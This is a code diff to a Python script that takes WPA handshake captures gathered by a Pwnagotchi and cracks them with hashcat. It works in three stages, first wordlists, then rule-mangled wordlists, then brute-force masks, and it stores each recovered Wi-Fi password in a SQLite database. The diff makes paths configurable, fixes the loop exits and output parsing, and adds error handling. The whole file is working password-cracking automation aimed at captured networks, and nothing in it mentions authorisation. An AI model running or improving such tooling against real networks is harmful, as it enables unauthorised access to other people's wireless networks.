@@ -1,12 +1,14 @@
 import subprocess
 import sqlite3
+import sys
+import os
 from pathlib import Path
 
-BASE = Path.home() / "pwnagotchi"
+BASE = Path(os.getenv("PWN_BASE", Path.home() / "pwnagotchi"))
 GOOD = BASE / "data/good_pcaps"
 HASHES = BASE / "data/hashes"
 DB = BASE / "db/networks.db"
-WORDLIST_DIR = Path.home() / "wordlists"
+WORDLIST_DIR = Path(os.getenv("PWN_WORDLIST_DIR", Path.home() / "wordlists"))
 RULE_DIR = WORDLIST_DIR / "rules"
 
 WORDLISTS = [
@@ -25,7 +27,6 @@ MASKS = [
     "?l?l?l?l?l?l?l?l?d?d",
 ]
 
-# Базовые флаги для M2: Metal-бэкенд, оптимизация, WPA-длины
 BASE_FLAGS = [
     "-m", "22000",
     "-w", "4",
@@ -33,77 +34,84 @@ BASE_FLAGS = [
     "--force",
 ]
 
-def run_hashcat(args: list[str]) -> None:
-    subprocess.run(["hashcat"] + BASE_FLAGS + args)
+def run_hashcat(args: list[str]) -> int:
+    result = subprocess.run(["hashcat"] + BASE_FLAGS + args)
+    return result.returncode
 
 def get_cracked_password(hashfile: Path) -> str | None:
     result = subprocess.run(
-        ["hashcat", "-m", "22000", str(hashfile), "--show"],
+        ["hashcat", "-m", "22000", "--show", "--outfile-format", "2", str(hashfile)],
         capture_output=True, text=True,
     )
-    for line in result.stdout.strip().splitlines():
-        if ":" in line:
-            return line.split(":")[-1]
+    line = result.stdout.strip()
+    if line:
+        return line.splitlines()[-1]
     return None
 
 DB.parent.mkdir(parents=True, exist_ok=True)
 conn = sqlite3.connect(DB)
 cur = conn.cursor()
 
-for pcap in GOOD.glob("*.pcap"):
-    hashfile = HASHES / (pcap.stem + ".22000")
+try:
+    for pcap in GOOD.glob("*.pcap"):
+        hashfile = HASHES / (pcap.stem + ".22000")
 
-    # Пропускаем уже взломанные
-    cur.execute("SELECT password FROM captures WHERE filename=?", (pcap.name,))
-    row = cur.fetchone()
-    if row and row[0]:
-        continue
-
-    if not hashfile.exists() or hashfile.stat().st_size == 0:
-        continue
-
-    cracked = False
-
-    # Этап 1 — словари
-    for wl in WORDLISTS:
-        if not wl.exists():
+        cur.execute("SELECT password FROM captures WHERE filename=?", (pcap.name,))
+        row = cur.fetchone()
+        if row and row[0]:
             continue
-        print(f"[*] Wordlist: {wl.name}")
-        run_hashcat([str(hashfile), str(wl)])
-        if get_cracked_password(hashfile):
-            cracked = True
-            break
 
-    # Этап 2 — правила (только если не взломан)
-    if not cracked:
+        if not hashfile.exists() or hashfile.stat().st_size == 0:
+            continue
+
+        cracked = False
+
+        # Stage 1 — wordlists
         for wl in WORDLISTS:
-            if not wl.exists() or cracked:
+            if not wl.exists():
                 continue
-            for rule in RULES:
-                if not rule.exists():
-                    continue
-                print(f"[*] Rule: {wl.name} + {rule.name}")
-                run_hashcat([str(hashfile), str(wl), "-r", str(rule)])
-                if get_cracked_password(hashfile):
-                    cracked = True
-                    break
-
-    # Этап 3 — маски (только если не взломан)
-    if not cracked:
-        for mask in MASKS:
-            print(f"[*] Mask: {mask}")
-            run_hashcat([str(hashfile), "-a", "3", mask])
+            print(f"[*] Wordlist: {wl.name}")
+            run_hashcat([str(hashfile), str(wl)])
             if get_cracked_password(hashfile):
+                cracked = True
                 break
 
-    # Сохраняем результат
-    password = get_cracked_password(hashfile)
-    if password:
-        print(f"[+] Found: {password}")
-        cur.execute(
-            "UPDATE captures SET hashfile=?, password=? WHERE filename=?",
-            (str(hashfile), password, pcap.name),
-        )
-        conn.commit()
+        # Stage 2 — rules (only if not cracked)
+        if not cracked:
+            for wl in WORDLISTS:
+                if not wl.exists():
+                    continue
+                for rule in RULES:
+                    if not rule.exists():
+                        continue
+                    print(f"[*] Rule: {wl.name} + {rule.name}")
+                    run_hashcat([str(hashfile), str(wl), "-r", str(rule)])
+                    if get_cracked_password(hashfile):
+                        cracked = True
+                        break
+                if cracked:
+                    break
 
-conn.close()
+        # Stage 3 — masks (only if not cracked)
+        if not cracked:
+            for mask in MASKS:
+                print(f"[*] Mask: {mask}")
+                run_hashcat([str(hashfile), "-a", "3", mask])
+                if get_cracked_password(hashfile):
+                    break
+
+        # Save result
+        password = get_cracked_password(hashfile)
+        if password:
+            print(f"[+] Found: {password}")
+            cur.execute(
+                "UPDATE captures SET hashfile=?, password=? WHERE filename=?",
+                (str(hashfile), password, pcap.name),
+            )
+            conn.commit()
+
+except Exception as e:
+    print(f"Error: {e}")
+    sys.exit(1)
+finally:
+    conn.close()
